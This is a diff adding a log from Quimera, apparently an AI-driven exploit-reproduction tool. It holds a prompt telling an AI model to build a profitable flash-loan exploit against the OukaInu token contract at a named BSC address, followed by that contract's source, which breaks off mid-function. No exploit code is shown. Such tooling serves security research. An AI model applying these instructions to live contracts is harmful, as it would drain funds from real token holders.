@@ -1,0 +1,1448 @@
+2026-03-11 18:55:33,440 [INFO] Quimera: Main task status: Starting Quimera... 🔱
+2026-03-11 18:55:33,441 [INFO] Quimera: Blocker: Waiting for network
+2026-03-11 18:55:33,441 [INFO] Quimera: Using block number 85956296 from command line argument.
+2026-03-11 18:55:33,441 [INFO] Quimera: Main task status: Fetching contract information 📡
+2026-03-11 18:55:37,681 [INFO] Quimera: <slither.slither.Slither object at 0x10aa32a50>
+2026-03-11 18:55:37,681 [INFO] Quimera: Contracts found: ['SafeMath', 'IBEP20', 'Auth', 'IDEXFactory', 'IDEXRouter', 'IDividendDistributor', 'DividendDistributor', 'OukaInu'], selected OukaInu
+2026-03-11 18:55:37,721 [INFO] Quimera: {'OukaInu'}
+2026-03-11 18:55:37,721 [INFO] Quimera: {'distributorGas', 'totalFeeSell', 'charityFee', 'owner', '_maxSellTxAmount', 'GREEDTriggeredAt', 'charityFeeSell', 'buybackMultiplierTriggeredAt', 'marketingFeeSell', 'devFeeSell', 'autoBuybackMultiplier', 'autoBuybackBlockLast', 'swapThreshold', 'router', 'autoBuybackEnabled', 'buybackFeeSell', 'stakingFee', 'distributor', 'totalFee', '_decimals', 'liquidityFee', 'autoBuybackCap', 'BUSD', 'inSwap', '_totalSupply', '_maxWalletToken', 'developmentFeeReceiver', 'liquidityFeeSell', 'autoLiquidityReceiver', 'deadBlocks', 'autoBuybackBlockPeriod', 'tradingOpen', 'buybackMultiplierLength', 'buyBackFeeReceiver', 'WBNB', 'charityFeeReceiver', 'stakingFeeBuy', 'buybackMultiplierDenominator', 'swapEnabled', 'autoBuybackAccumulator', 'launchedAt', 'cooldownTimerInterval', 'pair', 'ZERO', 'targetLiquidity', 'targetLiquidityDenominator', 'stakingFeeReceiver', 'devFee', 'GREEDDuration', 'autoBuybackAmount', 'DEAD', 'marketingFee', 'buybackMultiplierNumerator', 'feeDenominator', 'buybackFee', '_maxBuyTxAmount', 'buyCooldownEnabled', 'marketingFeeReceiver'}
+2026-03-11 18:55:55,466 [INFO] Quimera: Main task status: Installing and running Foundry 🛠️
+2026-03-11 18:55:55,467 [INFO] Quimera: Installing Forge...
+2026-03-11 18:55:57,606 [INFO] Quimera: Running Forge test...
+2026-03-11 18:56:15,301 [INFO] Quimera: Blocker: Not enough valuableToken balance to produce profit
+2026-03-11 18:56:15,513 [INFO] Quimera: Prompt: # Instructions
+
+We are going to reproduce a Solidity smart contract issue step by step related with 0x4A33D3ea4B30228C363222746939562FbAba2f01 and/or one of the "linked" contracts (e.g tokens, staking, etc) in the bsc chain which contains a deployment of the OukaInu contract.
+Before starting, please read the provided code, fetch related contracts using addresses (use the Foundry traces to get the values) and request their source code to understand how they work and where the issue is.
+The goal is to incrementally modifying a Foundry test according to the information produced during its execution (e.g. a trace) until we can reproduce the issue.
+This issue allows a user to start with a certain amount of WETH, perform some operations using the contract (or other related ones), and then obtain more WETH than the initial one.
+
+
+# Constraints
+
+* VERY IMPORTANT: If you do not have the source code already available, start fetching the source code of the contracts involved, using their addresses. You should do this at any time when you discover a new address or token that you need to interact to.
+* VERY IMPORTANT: Only use addresses fetched from the target contracts state, new deployment or `address(this)`. Never use hardcoded addresses or invent new ones.
+* VERY IMPORTANT: do NOT use any cheat code (e.g prank). You will disqualified if you do so.
+* Do NOT guess the internal behavior of the contract, instead use the information provided by the trace, which is always accurate.
+* Do NOT predict the trace output, you need to run the test and check the output.
+* Do NOT use SafeMath
+* Do NOT try a reentrancy attack if a function is using `nonReentrant` modifier, it will not work. You can still call other functions without this modifier or any other functions from any related contracts.
+* Do NOT use low-level calls
+* Do NOT define additional contracts to deploy but you can use imported ones (e.g. ERC20Mock)
+* Do NOT use third-parties during exploit (e.g. the owner doing something for you). You can still pass other contracts or EOA addresses as parameters to the exploit if needed.
+* Do NOT use any private key operations (e.g. signing messages, etc.)
+* Do NOT try to re-initialize the contract, it will not work.
+* Do NOT try to exploit underflows or overflow conditions unless the contract is using Solidity < 0.8.0 or unchecked block. It will not work. However, unsafe casting is an issue for all versions.
+* You SHOULD use at least 10 ether of liquidity. If the pair to swap tokens have low liquidity, you SHOULD find a alternative way to obtain tokens (e.g. look how they are minted).
+* If you want to simulate a EOA, use `vm.startPrank(address(this), address(this));` and `vm.stopPrank();` functions. These are the ONLY allowed cheatcodes.
+
+# Output Format
+
+You should output different sections using the following tags:
+- `<executeExploitCode>`: the code of the `executeExploit` function, which is the main function to exploit the flaw as well as any additional function needed (e.g. for callbacks or reentrancy).
+- `<additionalInterfaces>`: any additional interface you need to use, if not provided.
+- `<additionalContracts>`: any additional contract you need to use, if not provided.
+
+* These tags should be used, at most, a single time. The `executeExploitCode` section is mandatory, while the others are optional.
+* Do NOT forget to close the tags with `</executeExploitCode>`, `</additionalInterfaces>` and `</additionalContracts>`.
+* Only use `additionalInterfaces` and `additionalContracts` if you absolutely need to define new interfaces or contracts, otherwise do not use them.
+* Do NOT output the rest of the code, only answer with the format requested.
+
+# Recommendations
+
+* Carefully review how tokens flows from this contract, to the Uniswap pair (and maybe passing through others), and back to this contract to repay the flash loan.
+* You have initially a large amount of WETH available, but you don't have to use it all if you need it (depends on the liquidity available). Do not change this value, only use the part of the flashloan that you need.
+* You start with no tokens, except WETH, so you must find a way to obtain the right tokens in order to trigger the flaw.
+* Near the end, you need to swap all your tokens to WETH. Be careful with transfer fees and other constraints. The exploit should be "capital efficient", in order to be detectable when repaying the flashloan.
+* Use `console.log` to query the state of the contracts, if needed.
+* Keep the control flow of the exploit simple: do not use if conditions, only sequences of calls.
+* Try using different functions of the target contracts and evaluate the effects to see if they are useful for the exploit.
+* If the uniswap pair is not initially available and you need it, try to find a suitable token and query the Uniswap factory to get the pair address. Do NOT forget to call approve on the token for the router before using it.
+* If `transferFrom` reverts, try to use the `approve` function first.
+* If the target contract requires to use an address as paramter, try to see if you can use the address of the contract itself (e.g. address(this)), or the address of the test contract you deploy. If it is not validated, you can probably exploit it.
+
+
+# Code to review
+```
+/*
+Token Name: Ouka Inu
+Symbol: OUKA
+Supply : 1,000,000,000,000
+
+Tokenomics
+10% Buy 
+-Staking (Native token) 
+
+14% Sell 
+-5% Marketing (BNB)
+-3% Liquidity Add (BNB)
+-2% Buy backs (BNB)(tax free)
+-2% Development (BNB)
+-2% Charity(BNB)
+*/
+//SPDX-License-Identifier: MIT
+pragma solidity ^ 0.8 .7;
+library SafeMath {
+  function add(uint256 a, uint256 b) internal pure returns(uint256) {
+    uint256 c = a + b;
+    require(c >= a, "SafeMath: addition overflow");
+    return c;
+  }
+
+  function sub(uint256 a, uint256 b) internal pure returns(uint256) {
+    return sub(a, b, "SafeMath: subtraction overflow");
+  }
+
+  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
+    require(b <= a, errorMessage);
+    uint256 c = a - b;
+    return c;
+  }
+
+  function mul(uint256 a, uint256 b) internal pure returns(uint256) {
+    if (a == 0) {
+      return 0;
+    }
+    uint256 c = a * b;
+    require(c / a == b, "SafeMath: multiplication overflow");
+    return c;
+  }
+
+  function div(uint256 a, uint256 b) internal pure returns(uint256) {
+    return div(a, b, "SafeMath: division by zero");
+  }
+
+  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
+    // Solidity only automatically asserts when dividing by 0
+    require(b > 0, errorMessage);
+    uint256 c = a / b;
+    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+    return c;
+  }
+}
+/**
+ * BEP20 standard interface.
+ */
+interface IBEP20 {
+  function totalSupply() external view returns(uint256);
+
+  function decimals() external view returns(uint8);
+
+  function symbol() external view returns(string memory);
+
+  function name() external view returns(string memory);
+
+  function getOwner() external view returns(address);
+
+  function balanceOf(address account) external view returns(uint256);
+
+  function transfer(address recipient, uint256 amount) external returns(bool);
+
+  function allowance(address _owner, address spender) external view returns(uint256);
+
+  function approve(address spender, uint256 amount) external returns(bool);
+
+  function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
+  event Transfer(address indexed from, address indexed to, uint256 value);
+  event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+abstract contract Auth {
+  address internal owner;
+  mapping(address => bool) internal authorizations;
+  constructor(address _owner) {
+    owner = _owner;
+    authorizations[_owner] = true;
+  }
+  /**
+   * Function modifier to require caller to be contract owner
+   */
+  modifier onlyOwner() {
+    require(isOwner(msg.sender), "!OWNER");
+    _;
+  }
+  /**
+   * Function modifier to require caller to be authorized
+   */
+  modifier authorized() {
+    require(isAuthorized(msg.sender), "!AUTHORIZED");
+    _;
+  }
+  /**
+   * Authorize address. Owner only
+   */
+  function authorize(address account) public onlyOwner {
+    authorizations[account] = true;
+  }
+  /**
+   * Remove address authorization. Owner only
+   */
+  function unauthorize(address account) public onlyOwner {
+    authorizations[account] = false;
+  }
+  /**
+   * Check if address is owner
+   */
+  function isOwner(address account) public view returns(bool) {
+    return account == owner;
+  }
+  /**
+   * Return address authorization status
+   */
+  function isAuthorized(address account) public view returns(bool) {
+    return authorizations[account];
+  }
+  /**
+   * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
+   */
+  function transferOwnership(address payable account) public onlyOwner {
+    owner = account;
+    authorizations[account] = true;
+    emit OwnershipTransferred(account);
+  }
+  event OwnershipTransferred(address owner);
+}
+/* Standard IDEXFactory */
+interface IDEXFactory {
+  function createPair(address tokenA, address tokenB) external returns(address pair);
+}
+/* Standard IDEXRouter */
+interface IDEXRouter {
+  function factory() external pure returns(address);
+
+  function WETH() external pure returns(address);
+
+  function addLiquidity(address tokenA, address tokenB, uint amountADesired, uint amountBDesired, uint amountAMin, uint amountBMin, address to, uint deadline) external returns(uint amountA, uint amountB, uint liquidity);
+
+  function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns(uint amountToken, uint amountETH, uint liquidity);
+
+  function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
+
+  function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable;
+
+  function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
+}
+/* Interface for the DividendDistributor */
+interface IDividendDistributor {
+  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
+
+  function setShare(address shareholder, uint256 amount) external;
+
+  function deposit() external payable;
+
+  function process(uint256 gas) external;
+}
+/* Our DividendDistributor contract responsible for distributing the earn token */
+contract DividendDistributor is IDividendDistributor {
+  using SafeMath
+  for uint256;
+  address _token;
+  struct Share {
+    uint256 amount;
+    uint256 totalExcluded;
+    uint256 totalRealised;
+  }
+  // EARN
+  IBEP20 BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+  address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+  IDEXRouter router;
+  address[] shareholders;
+  mapping(address => uint256) shareholderIndexes;
+  mapping(address => uint256) shareholderClaims;
+  mapping(address => Share) public shares;
+  uint256 public totalShares;
+  uint256 public totalDividends;
+  uint256 public totalDistributed;
+  uint256 public dividendsPerShare;
+  uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;
+  uint256 public minPeriod = 30 * 60;
+  uint256 public minDistribution = 1 * (10 ** 12);
+  uint256 currentIndex;
+  bool initialized;
+  modifier initialization() {
+    require(!initialized);
+    _;
+    initialized = true;
+  }
+  modifier onlyToken() {
+    require(msg.sender == _token);
+    _;
+  }
+  constructor(address _router) {
+    router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    _token = msg.sender;
+  }
+
+  function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken {
+    minPeriod = _minPeriod;
+    minDistribution = _minDistribution;
+  }
+
+  function setShare(address shareholder, uint256 amount) external override onlyToken {
+    if (shares[shareholder].amount > 0) {
+      distributeDividend(shareholder);
+    }
+    if (amount > 0 && shares[shareholder].amount == 0) {
+      addShareholder(shareholder);
+    } else if (amount == 0 && shares[shareholder].amount > 0) {
+      removeShareholder(shareholder);
+    }
+    totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
+    shares[shareholder].amount = amount;
+    shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
+  }
+
+  function deposit() external payable override onlyToken {
+    uint256 balanceBefore = BUSD.balanceOf(address(this));
+    address[] memory path = new address[](2);
+    path[0] = WBNB;
+    path[1] = address(BUSD);
+    router.swapExactETHForTokensSupportingFeeOnTransferTokens {
+      value: msg.value
+    }(0, path, address(this), block.timestamp);
+    uint256 amount = BUSD.balanceOf(address(this)).sub(balanceBefore);
+    totalDividends = totalDividends.add(amount);
+    dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
+  }
+
+  function process(uint256 gas) external override onlyToken {
+    uint256 shareholderCount = shareholders.length;
+    if (shareholderCount == 0) {
+      return;
+    }
+    uint256 gasUsed = 0;
+    uint256 gasLeft = gasleft();
+    uint256 iterations = 0;
+    while (gasUsed < gas && iterations < shareholderCount) {
+      if (currentIndex >= shareholderCount) {
+        currentIndex = 0;
+      }
+      if (shouldDistribute(shareholders[currentIndex])) {
+        distributeDividend(shareholders[currentIndex]);
+      }
+      gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
+      gasLeft = gasleft();
+      currentIndex++;
+      iterations++;
+    }
+  }
+
+  function shouldDistribute(address shareholder) internal view returns(bool) {
+    return shareholderClaims[shareholder] + minPeriod < block.timestamp && getUnpaidEarnings(shareholder) > minDistribution;
+  }
+
+  function distributeDividend(address shareholder) internal {
+    if (shares[shareholder].amount == 0) {
+      return;
+    }
+    uint256 amount = getUnpaidEarnings(shareholder);
+    if (amount > 0) {
+      totalDistributed = totalDistributed.add(amount);
+      BUSD.transfer(shareholder, amount);
+      shareholderClaims[shareholder] = block.timestamp;
+      shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
+      shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
+    }
+  }
+
+  function claimDividend(address shareholder) external onlyToken {
+    distributeDividend(shareholder);
+  }
+
+  function getUnpaidEarnings(address shareholder) public view returns(uint256) {
+    if (shares[shareholder].amount == 0) {
+      return 0;
+    }
+    uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
+    uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
+    if (shareholderTotalDividends <= shareholderTotalExcluded) {
+      return 0;
+    }
+    return shareholderTotalDividends.sub(shareholderTotalExcluded);
+  }
+
+  function getCumulativeDividends(uint256 share) internal view returns(uint256) {
+    return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
+  }
+
+  function addShareholder(address shareholder) internal {
+    shareholderIndexes[shareholder] = shareholders.length;
+    shareholders.push(shareholder);
+  }
+
+  function removeShareholder(address shareholder) internal {
+    shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length - 1];
+    shareholderIndexes[shareholders[shareholders.length - 1]] = shareholderIndexes[shareholder];
+    shareholders.pop();
+  }
+}
+/* Token contract */
+contract OukaInu is IBEP20, Auth {
+  using SafeMath
+  for uint256;
+  // Addresses
+  address BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
+  address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+  address DEAD = 0x000000000000000000000000000000000000dEaD;
+  address ZERO = 0x0000000000000000000000000000000000000000;
+  // These are owner by default
+  address public autoLiquidityReceiver;
+  address public marketingFeeReceiver;
+  address public buyBackFeeReceiver;
+  address public developmentFeeReceiver;
+  address public charityFeeReceiver;
+  address public stakingFeeReceiver;
+  // Name and symbol
+  string constant _name = "Ouka Inu";
+  string constant _symbol = "OUKA";
+  uint8 constant _decimals = 9;
+  // Total supply
+  uint256 _totalSupply = 1 * 10 ** 12 * 10 ** _decimals;
+  // Max wallet and TX
+  uint256 public _maxBuyTxAmount = _totalSupply * 300 / 10000; // 3% or 3m tokens
+  uint256 public _maxSellTxAmount = _totalSupply * 150 / 10000; // 5% or 5M tokens
+  uint256 public _maxWalletToken = (_totalSupply * 300) / 10000; // 3% or 3m tokens
+  // Mappings
+  mapping(address => uint256) _balances;
+  mapping(address => mapping(address => uint256)) _allowances;
+  mapping(address => bool) isFeeExempt;
+  mapping(address => bool) isTxLimitExempt;
+  mapping(address => bool) isTimelockExempt;
+  mapping(address => bool) isDividendExempt;
+  mapping(address => bool) public isBlacklisted;
+  // Buy Fees
+  uint256 stakingFeeBuy = 10;
+  // Sell fees
+  uint256 liquidityFeeSell = 3;
+  uint256 buybackFeeSell = 2;
+  uint256 charityFeeSell = 2;
+  uint256 marketingFeeSell = 5;
+  uint256 devFeeSell = 2;
+  uint256 totalFeeSell = 14;
+  // Fee variables
+  uint256 liquidityFee;
+  uint256 buybackFee;
+  uint256 charityFee;
+  uint256 marketingFee;
+  uint256 devFee;
+  uint256 totalFee;
+  uint256 stakingFee;
+  uint256 feeDenominator = 100;
+  // GREED
+  uint256 private GREEDTriggeredAt;
+  uint256 private GREEDDuration = 3600;
+  // Dead blocks
+  uint256 deadBlocks = 3;
+  // Sell amount of tokens when a sell takes place
+  uint256 public swapThreshold = _totalSupply * 150 / 10000; // 1.5% of supply
+  // Liquidity
+  uint256 targetLiquidity = 20;
+  uint256 targetLiquidityDenominator = 100;
+  // Buyback settings
+  uint256 buybackMultiplierNumerator = 200;
+  uint256 buybackMultiplierDenominator = 100;
+  uint256 buybackMultiplierTriggeredAt;
+  uint256 buybackMultiplierLength = 30 minutes;
+  bool public autoBuybackEnabled = false;
+  bool public autoBuybackMultiplier = true;
+  uint256 autoBuybackCap;
+  uint256 autoBuybackAccumulator;
+  uint256 autoBuybackAmount;
+  uint256 autoBuybackBlockPeriod;
+  uint256 autoBuybackBlockLast;
+  DividendDistributor distributor;
+  uint256 distributorGas = 500000;
+  // Cooldown & timer functionality
+  bool public buyCooldownEnabled = true;
+  uint8 public cooldownTimerInterval = 4;
+  mapping(address => uint) private cooldownTimer;
+  // Other variables
+  IDEXRouter public router;
+  address public pair;
+  uint256 public launchedAt;
+  bool public tradingOpen = false;
+  bool public swapEnabled = true;
+  bool inSwap;
+  modifier swapping() {
+    inSwap = true;
+    _;
+    inSwap = false;
+  }
+  /* Token constructor */
+  constructor() Auth(msg.sender) {
+    router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
+    _allowances[address(this)][address(router)] = type(uint256).max;
+    distributor = new DividendDistributor(address(router));
+    // Should be the owner wallet/token distributor
+    address _presaler = msg.sender;
+    isFeeExempt[_presaler] = true;
+    isTxLimitExempt[_presaler] = true;
+    // No timelock for these people
+    isTimelockExempt[msg.sender] = true;
+    isTimelockExempt[DEAD] = true;
+    isTimelockExempt[address(this)] = true;
+    // Exempt from dividend
+    isDividendExempt[pair] = true;
+    isDividendExempt[address(this)] = true;
+    isDividendExempt[DEAD] = true;
+    // Set the marketing and liq receiver to the owner as default
+    autoLiquidityReceiver = 0xe1e7703841b16d61c23Fdf61d5F5Be6a88c293BB;
+    marketingFeeReceiver = 0x79F168512BFC75709cE3919ECcd51DEC48f62502;
+    buyBackFeeReceiver = 0x7B607249675C40733E13db4221386822f94B46aa;
+    developmentFeeReceiver = 0x0BdFc49D8F691f0d993d013e74F83405b77387b4;
+    charityFeeReceiver = 0xeeC03165D878e6634A1Fa2e242760d4fB5711849;
+    stakingFeeReceiver = 0x8B543639C657ADf1a5e2F4D839a9F680107faeA6;
+    _balances[_presaler] = _totalSupply;
+    emit Transfer(address(0), _presaler, _totalSupply);
+  }
+  receive() external payable {}
+
+  function totalSupply() external view override returns(uint256) {
+    return _totalSupply;
+  }
+
+  function decimals() external pure override returns(uint8) {
+    return _decimals;
+  }
+
+  function symbol() external pure override returns(string memory) {
+    return _symbol;
+  }
+
+  function name() external pure override returns(string memory) {
+    return _name;
+  }
+
+  function getOwner() external view override returns(address) {
+    return owner;
+  }
+
+  function balanceOf(address account) public view override returns(uint256) {
+    return _balances[account];
+  }
+
+  function allowance(address holder, address spender) external view override returns(uint256) {
+    return _allowances[holder][spender];
+  }
+
+  function approve(address spender, uint256 amount) public override returns(bool) {
+    _allowances[msg.sender][spender] = amount;
+    emit Approval(msg.sender, spender, amount);
+    return true;
+  }
+
+  function approveMax(address spender) external returns(bool) {
+    return approve(spender, type(uint256).max);
+  }
+
+  function transfer(address recipient, uint256 amount) external override returns(bool) {
+    return _transferFrom(msg.sender, recipient, amount);
+  }
+
+  function transferFrom(address sender, address recipient, uint256 amount) external override returns(bool) {
+    if (_allowances[sender][msg.sender] != type(uint256).max) {
+      _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
+    }
+    return _transferFrom(sender, recipient, amount);
+  }
+  // settting the max wallet in percentages
+  // NOTE: 1% = 100
+  function setMaxWalletPercent(uint256 maxWallPercent) external onlyOwner() {
+    _maxWalletToken = _totalSupply.mul(maxWallPercent).div(10000);
+  }
+
+  function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
+    uint256 amountBNB = address(this).balance;
+    payable(marketingFeeReceiver).transfer(amountBNB * amountPercentage / 100);
+  }
+  // Main transfer function
+  function _transferFrom(address sender, address recipient, uint256 amount) internal returns(bool) {
+    if (inSwap) {
+      return _basicTransfer(sender, recipient, amount);
+    }
+    // Check if trading is enabled
+    if (!authorizations[sender] && !authorizations[recipient]) {
+      require(tradingOpen, "Trading not enabled yet");
+    }
+    // Check if address is blacklisted
+    require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is blacklisted');
+    // Check if buying or selling
+    bool isSell = recipient == pair;
+    // Set buy or sell fees
+    setCorrectFees(isSell);
+    // Check max wallet
+    checkMaxWallet(sender, recipient, amount);
+    // Buycooldown 
+    checkBuyCooldown(sender, recipient);
+    // Checks maxTx
+    checkTxLimit(sender, amount, recipient, isSell);
+    // Check if we are in GREEDTime
+    bool GREEDMode = inGREEDTime();
+    // Check if we should do the swapback
+    if (shouldSwapBack()) {
+      swapBack();
+    }
+    //Exchange tokens
+    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+    uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, isSell, GREEDMode) : amount;
+    _balances[recipient] = _balances[recipient].add(amountReceived);
+    // Dividend tracker
+    if (!isDividendExempt[sender]) {
+      try distributor.setShare(sender, _balances[sender]) {} catch {}
+    }
+    if (!isDividendExempt[recipient]) {
+      try distributor.setShare(recipient, _balances[recipient]) {} catch {}
+    }
+    try distributor.process(distributorGas) {} catch {}
+    emit Transfer(sender, recipient, amountReceived);
+    return true;
+  }
+  // Do a normal transfer
+  function _basicTransfer(address sender, address recipient, uint256 amount) internal returns(bool) {
+    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+    _balances[recipient] = _balances[recipient].add(amount);
+    emit Transfer(sender, recipient, amount);
+    return true;
+  }
+  // Set the correct fees for buying or selling
+  function setCorrectFees(bool isSell) internal {
+    if (isSell) {
+      liquidityFee = liquidityFeeSell;
+      buybackFee = buybackFeeSell;
+      charityFee = charityFeeSell;
+      marketingFee = marketingFeeSell;
+      devFee = devFeeSell;
+      totalFee = totalFeeSell;
+    } else {
+      stakingFee = stakingFeeBuy;
+    }
+  }
+  // Check if we are in GREED time
+  function inGREEDTime() private returns(bool) {
+    if (GREEDTriggeredAt.add(GREEDDuration) > block.timestamp) {
+      return true;
+    } else {
+      return false;
+    }
+  }
+  // Check for maxTX
+  function checkTxLimit(address sender, uint256 amount, address recipient, bool isSell) internal view {
+    if (recipient != owner) {
+      if (isSell) {
+        require(amount <= _maxSellTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
+      } else {
+        require(amount <= _maxBuyTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");
+      }
+    }
+  }
+  // Check buy cooldown
+  function checkBuyCooldown(address sender, address recipient) internal {
+    if (sender == pair && buyCooldownEnabled && !isTimelockExempt[recipient]) {
+      require(cooldownTimer[recipient] < block.timestamp, "Please wait between two buys");
+      cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
+    }
+  }
+  // Check maxWallet
+  function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
+    if (!authorizations[sender] && recipient != owner && recipient != address(this) && recipient != address(DEAD) && recipient != pair && recipient != marketingFeeReceiver && recipient != autoLiquidityReceiver) {
+      uint256 heldTokens = balanceOf(recipient);
+      require((heldTokens + amount) <= _maxWalletToken, "Total Holding is currently limited, you can not buy that much.");
+    }
+  }
+  // Check if sender is not feeExempt
+  function shouldTakeFee(address sender) internal view returns(bool) {
+    return !isFeeExempt[sender];
+  }
+  // Get total fee's or multiplication of fees
+  function getTotalFee(bool selling) public view returns(uint256) {
+    if (launchedAt + deadBlocks >= block.number) {
+      return feeDenominator.sub(1);
+    }
+    if (selling && buybackMultiplierTriggeredAt.add(buybackMultiplierLength) > block.timestamp) {
+      return getMultipliedFee();
+    }
+    return totalFee;
+  }
+  // Get a multiplied fee when buybackMultiplier is active
+  function getMultipliedFee() public view returns(uint256) {
+    uint256 remainingTime = buybackMultiplierTriggeredAt.add(buybackMultiplierLength).sub(block.timestamp);
+    uint256 feeIncrease = totalFee.mul(buybackMultiplierNumerator).div(buybackMultiplierDenominator).sub(totalFee);
+    return totalFee.add(feeIncrease.mul(remainingTime).div(buybackMultiplierLength));
+  }
+  // Take the normal total Fee or the GREED Fee
+  function takeFee(address sender, uint256 amount, bool isSell, bool GREEDMode) internal returns(uint256) {
+    uint256 feeAmount;
+    // Check if we are GREEDd
+    if (GREEDMode) {
+      if (isSell) {
+        // We are selling so up the selling tax to 1.5x
+        feeAmount = amount.mul(totalFee).mul(3).div(2).div(feeDenominator);
+      } else {
+        // We are buying so cut our taxes in half
+        feeAmount = amount.mul(totalFee).div(2).div(feeDenominator);
+      }
+    } else {
+      feeAmount = amount.mul(totalFee).div(feeDenominator);
+    }
+    _balances[address(this)] = _balances[address(this)].add(feeAmount);
+    emit Transfer(sender, address(this), feeAmount);
+    return amount.sub(feeAmount);
+  }
+  // Check if we should sell tokens
+  function shouldSwapBack() internal view returns(bool) {
+    return msg.sender != pair && !inSwap && swapEnabled && _balances[address(this)] >= swapThreshold;
+  }
+  // switch Trading
+  function tradingStatus(bool _status) public onlyOwner {
+    tradingOpen = _status;
+    launch();
+  }
+  // Enable GREED
+  function enableGREED(uint256 _seconds) private authorized {
+    GREEDTriggeredAt = block.timestamp;
+    GREEDDuration = _seconds;
+  }
+  // Disable the GREED mode
+  function disableGREED() private authorized {
+    GREEDTriggeredAt = 0;
+  }
+  // Enable/disable cooldown between trades
+  function cooldownEnabled(bool _status, uint8 _interval) public authorized {
+    buyCooldownEnabled = _status;
+    cooldownTimerInterval = _interval;
+  }
+  // Blacklist/unblacklist an address
+  function blacklistAddress(address _address, bool _value) public authorized {
+    isBlacklisted[_address] = _value;
+  }
+  // Main swapback to sell tokens for WBNB
+  function swapBack() internal swapping {
+    uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
+    uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
+    uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
+    address[] memory path = new address[](2);
+    path[0] = address(this);
+    path[1] = WBNB;
+    uint256 balanceBefore = address(this).balance;
+    router.swapExactTokensForETHSupportingFeeOnTransferTokens(amountToSwap, 0, path, address(this), block.timestamp);
+    uint256 amountBNB = address(this).balance.sub(balanceBefore);
+    uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));
+    uint256 amountBNBLiquidity = amountBNB.mul(dynamicLiquidityFee).div(totalBNBFee).div(2);
+    uint256 amountBNBCharity = amountBNB.mul(charityFee).div(totalBNBFee);
+    uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
+    uint256 amountBNBDev = amountBNB.mul(devFee).div(totalBNBFee);
+    uint256 amountBNBBuyBack = amountBNB.mul(buybackFee).div(totalBNBFee);
+    uint256 amountBNBStaking = amountBNB.mul(stakingFee).div(totalBNBFee);
+    try distributor.deposit {
+      value: amountBNBStaking
+    }() {} catch {}
+    payable(marketingFeeReceiver).transfer(amountBNBMarketing);
+    payable(buyBackFeeReceiver).transfer(amountBNBBuyBack);
+    payable(developmentFeeReceiver).transfer(amountBNBDev);
+    payable(charityFeeReceiver).transfer(amountBNBCharity);
+    payable(stakingFeeReceiver).transfer(amountBNBStaking);
+    if (amountToLiquify > 0) {
+      router.addLiquidityETH {
+        value: amountBNBLiquidity
+      }(address(this), amountToLiquify, 0, 0, autoLiquidityReceiver, block.timestamp);
+      emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
+    }
+  }
+  // Check if autoBuyback is enabled
+  function shouldAutoBuyback() internal view returns(bool) {
+    return msg.sender != pair && !inSwap && autoBuybackEnabled && autoBuybackBlockLast + autoBuybackBlockPeriod <= block.number && address(this).balance >= autoBuybackAmount;
+  }
+  // Trigger a manual buyback
+  function triggerManualBuyback(uint256 amount, bool triggerBuybackMultiplier) external authorized {
+    uint256 amountWithDecimals = amount * (10 ** 18);
+    uint256 amountToBuy = amountWithDecimals.div(100);
+    buyTokens(amountToBuy, DEAD);
+    if (triggerBuybackMultiplier) {
+      buybackMultiplierTriggeredAt = block.timestamp;
+      emit BuybackMultiplierActive(buybackMultiplierLength);
+    }
+  }
+  // Stop the buyback Multiplier
+  function clearBuybackMultiplier() external authorized {
